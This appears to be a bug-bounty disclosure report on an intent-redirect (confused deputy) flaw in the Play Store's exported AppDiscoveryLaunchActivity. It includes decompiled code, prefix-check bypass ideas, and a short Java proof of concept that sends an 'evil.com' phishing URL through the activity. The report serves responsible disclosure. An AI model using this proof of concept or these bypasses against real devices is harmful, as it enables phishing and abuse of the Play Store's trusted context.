# VRP Report #41: Play Store AppDiscoveryLaunchActivity Intent Redirect

## Summary
Google Play Store (`com.android.vending`) exports `AppDiscoveryLaunchActivity` which takes a URI from its incoming intent and creates a new implicit `ACTION_VIEW` intent with that URI (line 85). This is a classic intent redirect / confused deputy pattern. A vulnerability fix flag `AppDiscoveryVulnerabilityFix` exists, but its effectiveness depends on server-side Phenotype flag configuration and may have bypass paths.

## Affected Component

| Component | Exported | Permission | launchMode |
|-----------|----------|------------|------------|
| `AppDiscoveryLaunchActivity` | true | NONE | singleInstance |

Additional attributes: `excludeFromRecents=true`, `allowTaskReparenting=true`, `noHistory=true`

## Vulnerability Details

### Intent Redirect (Line 85)
```java
// Takes URI from incoming intent, creates new implicit VIEW intent
startActivity(new Intent("android.intent.action.VIEW")
    .addCategory("android.intent.category.BROWSABLE")
    .setData(getIntent().getData()));
finish();
```

### Vulnerability Fix (Lines 51-57)
```java
boolean zU = this.b.u("AppDiscoveryVulnerabilityFix", alqc.b);
boolean zStartsWith = data.toString().startsWith("https://play.google.com/store/apps/details");
if (zU && !zStartsWith) {
    FinskyLog.f("Instant app URLs are disabled.", new Object[0]);
    finish();
    return;
}
```

### Analysis of the Fix
1. **Flag dependency**: The fix is gated behind `AppDiscoveryVulnerabilityFix` Phenotype flag
   - If flag is **disabled** (or not yet synced): ALL URIs are forwarded — full redirect
   - If flag is **enabled**: Only `https://play.google.com/store/apps/details*` prefixed URLs pass

2. **Prefix bypass potential**: The check uses `data.toString().startsWith(...)` which:
   - Allows ANY suffix: `https://play.google.com/store/apps/details?param=anything`
   - Allows path traversal in string form: `https://play.google.com/store/apps/details/../other` (matches prefix but resolves differently)

3. **Context elevation**: The new VIEW intent is sent FROM the Play Store's process context. Any target activity receiving the intent sees `getCallingPackage() == "com.android.vending"`, potentially granting elevated trust.

## Proof of Concept

```java
// Test 1: Check if fix flag is disabled (full redirect)
Intent test1 = new Intent();
test1.setClassName("com.android.vending",
    "com.google.android.finsky.appdiscoveryservice.AppDiscoveryLaunchActivity");
test1.setData(Uri.parse("https://evil.com/phishing"));
startActivity(test1);

// Test 2: Even with fix enabled, redirect with trusted prefix
Intent test2 = new Intent();
test2.setClassName("com.android.vending",
    "com.google.android.finsky.appdiscoveryservice.AppDiscoveryLaunchActivity");
test2.setData(Uri.parse("https://play.google.com/store/apps/details?id=com.example&referrer=evil"));
startActivity(test2);
```

## Impact

### If Fix is Disabled (Flag not set)
- **Phishing**: Launch attacker-controlled URLs from Play Store context
- **Content URI access**: Forward content:// URIs, elevating access via Play Store's permissions
- **Intent redirect**: Use Play Store as a launch trampoline to access other apps' exported components

### If Fix is Enabled
- **Trusted prefix redirect**: URLs matching the prefix still get forwarded from Play Store context
- **Play Store context trust**: Target apps may grant elevated trust to intents from com.android.vending

### Severity
- **User Interaction**: NONE
- **Permissions Required**: NONE
- **Attack Complexity**: LOW

## Dynamic Testing Required
- Check if `AppDiscoveryVulnerabilityFix` flag is currently enabled on device
- Test full redirect with arbitrary URI
- Test prefix bypass with path traversal

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- Play Store version as bundled
